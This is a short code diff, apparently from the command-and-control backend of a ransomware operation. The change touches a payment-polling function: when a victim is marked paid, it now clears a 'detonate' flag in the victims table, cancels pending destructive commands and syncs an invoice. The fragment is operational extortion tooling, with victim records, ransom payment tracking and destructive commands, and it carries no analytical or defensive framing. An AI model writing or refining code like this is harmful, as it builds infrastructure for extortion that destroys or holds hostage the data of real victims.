@@ -112,8 +112,8 @@ def poll_once() -> int:
                     conn.rollback()
                     continue
                 conn.execute(
-                    "UPDATE victims SET status='paid', paid_at=? WHERE vid=?",
-                    (c2db.now(), v["vid"]))
+                    "UPDATE victims SET status='paid', paid_at=?, detonate=0 "
+                    "WHERE vid=?", (c2db.now(), v["vid"]))
                 conn.commit()
                 c2db.cancel_destructive_commands(v["vid"])
                 c2db.sync_invoice(v["vid"], "paid")
